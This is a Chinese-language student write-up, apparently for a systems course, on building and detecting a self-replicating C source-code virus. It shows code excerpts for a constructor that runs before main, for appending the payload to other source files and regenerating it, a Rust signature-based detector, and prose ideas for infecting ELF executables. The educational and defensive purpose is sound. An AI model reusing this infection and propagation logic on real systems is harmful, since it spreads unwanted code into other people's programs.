# 第二次讨论

> 违反国家规定，对计算机信息系统功能进行删除、修改、增加、干扰，造成计算机信息系统不能正常运行，后果严重的，处五年以下有期徒刑或者拘役；后果特别严重的，处五年以上有期徒刑。
>
> 故意制作、传播计算机病毒等破坏性程序，影响计算机系统正常运行，后果严重的，依照第一款的规定处罚。
>
> —— 《中华人民共和国刑法》第二百八十六条

## 1. 病毒

代码：`https://github.com/caiwen666/hnu-cs/blob/main/discussion2/virus.c`

```c
__attribute__((constructor)) static void virus_action_fdgffdgsdhgtrhtshs() {
    puts("Welcome to HNU CSAPP!");
    infect_fdgffdgsdhgtrhtshs();
}
```

`__attribute__((constructor))` 修饰的函数会在程序启动时，在 `main` 函数之前被执行。（GCC 和 Clang 特有的，貌似 MSVC 并不支持）

注入的代码中的符号一律使用 `static` 修饰，确保内部链接性。在符号的结尾加上毫无意义的字符串 `fdgffdgsdhgtrhtshs` 确保不会和已有代码产生冲突。

由于 C 语言没有 RAII，所以只好使用 `goto` 来实现：

```c
...
    if (len <= 0) goto failed_with_fp;
    char *buf = malloc((size_t)len + 1u);
    if (!buf) goto failed_with_fp;
    if (fseek(fp, 0, SEEK_SET) != 0) goto failed_with_buf;
    if (fread(buf, 1, (size_t)len, fp) != (size_t)len) goto failed_with_buf;
    buf[len] = '\0';
    if (strstr(buf, "// VIRUS_PAYLOAD""_BEGIN_MARKER")) goto failed_with_buf;
...
failed_with_buf:
    free(buf);
failed_with_fp:
    fclose(fp);
```

感染传播需要做到在感染文件的同时，让被感染的文件同时也携带感染别的文件的代码。

```c
static const char *PAYLOAD_fdgffdgsdhgtrhtshs[] = {...}

// VIRUS_PAYLOAD_BEGIN_MARKER
...
// VIRUS_PAYLOAD_END_MARKER
```

`// VIRUS_PAYLOAD_BEGIN_MARKER` 和 `// VIRUS_PAYLOAD_END_MARKER` 之间的部分为恶意代码的主体。`PAYLOAD_fdgffdgsdhgtrhtshs` 存储了这部分代码的字符串。

存储代码的字符串会带来字符的转义问题，我们的设计是把代码分成若干个段，其中转义字符单独作为一个段，这样方便后面判断。

在感染时，会把 `PAYLOAD_fdgffdgsdhgtrhtshs` 中存储的代码内容直接追加到目标代码文件的尾部。同时，为了使得目标代码文件也有感染别的文件的能力，所以需要根据 `PAYLOAD_fdgffdgsdhgtrhtshs` 的内容，为目标代码文件也加上定义 `PAYLOAD_fdgffdgsdhgtrhtshs` 的代码：

```c
fputs("static const char *PAYLOAD_fdgffdgsdhgtrhtshs[] = {", fp);
for (size_t i = 0; i < payload_count; ++i) {
    const char *p = PAYLOAD_fdgffdgsdhgtrhtshs[i];
    fputs("\"",fp);
    if (strlen(p) == 1) { // 体现了转义字符单独作为一个段的便捷性
        if (p[0] == '\n') fputs("\\n", fp);
        else if (p[0] == '\t') fputs("\\t", fp);
        else if (p[0] == '\\') fputs("\\\\", fp);
        else if (p[0] == '\"') fputs("\\\"", fp);
        else if (p[0] == '\'') fputs("\\\'", fp);
        else fputc(p[0], fp);
    } else fputs(p, fp);
    fputs("\",",fp);
}
fputs("};\n\n", fp);
```

而 `PAYLOAD_fdgffdgsdhgtrhtshs` 的构造是通过 Python 脚本完成的，见代码仓库 `discussion2/build_payload.py`。

## 2. 查杀病毒

根据第一部分编写的病毒的特征：

* 判断是否是 ELF 文件（检查魔数）
* 判断文件内是否包含 `VIRUS_PAYLOAD_BEGIN_MARKER`
* 判断文件内是否包含 `fdgffdgsdhgtrhtshs`
* 判断文件内是否包含 `Welcome to HNU CSAPP!`

代码：`https://github.com/caiwen666/hnu-cs/blob/main/discussion2/src/bin/check_hnu_csapp_infection.rs`

```rust
fn contains(haystack: &[u8], needle: &[u8]) -> bool {
    if needle.is_empty() || haystack.len() < needle.len() {
        return false;
    }
    haystack.windows(needle.len()).any(|w| w == needle)
}
```

## 3. 感染可执行文件

**思路一：修改已有的 PT_LOAD 段**

直接在带有执行权限的 PT_LOAD 段上面注入恶意代码，然后修改 `e_entry` 处的地址到注入的恶意代码。在恶意代码的最后再跳到原来的正常的程序入口处。

但是 ELF 内的内容摆放地非常“紧密”，直接从中间插入数据的话，需要重新计算所有段的偏移，几乎是要重建整个 Program Header Table。

这还不是最糟糕的。PT_LOAD 段之间在虚拟内存中的排列也很“紧密”，可能带有执行权限的 PT_LOAD 段和下一个 PT_LOAD 段之间只有 511 字节的空隙（由于内存分页对齐），如果注入的代码超过了 511 字节，可能还需要考虑重新排布虚拟内存的布局，相当困难。

**思路二：追加一个 PT_LOAD 段**

直接在原来的 ELF 后面追加一个带有执行权限的 PT_LOAD 段，这样的话注入的代码长度没有什么限制。

但是需要在 Program Header Table 里面添加一项，如果 Program Header Table 区域没有空闲空间的话，那么需要对 Program Header Table 扩容，类似于思路一，从中间插入数据，需要重新计算所有段的偏移。

**思路三：篡改已有的段**

ELF 文件中的 PT_NOTE 段，还有一些 PT_GNU_ 开头的段，似乎对程序的加载运行这件事本身没有什么影响。我们可以，比如说，直接从 ELF 文件的最后追加恶意代码，然后把一个 PT_NOTE 段改成 PT_LOAD 段，将文件最后的代码加载到虚拟内存中。

这个思路可行性比较高，但是后续还会存在一些问题。比如我们注入的代码基本用不了 C 标准库的函数，因为我们只能单纯地注入代码，对标准库进行链接比较难搞。可能需要手搓 Linux 的系统调用。

**思路四：Wrapper**

把恶意代码做成一个壳子，包裹住被感染的可执行文件。运行时，先执行恶意代码，然后再把包裹住的可执行文件释放出去，再接着正常执行原来的可执行文件。

直觉上来说，似乎这样的病毒容易被发现。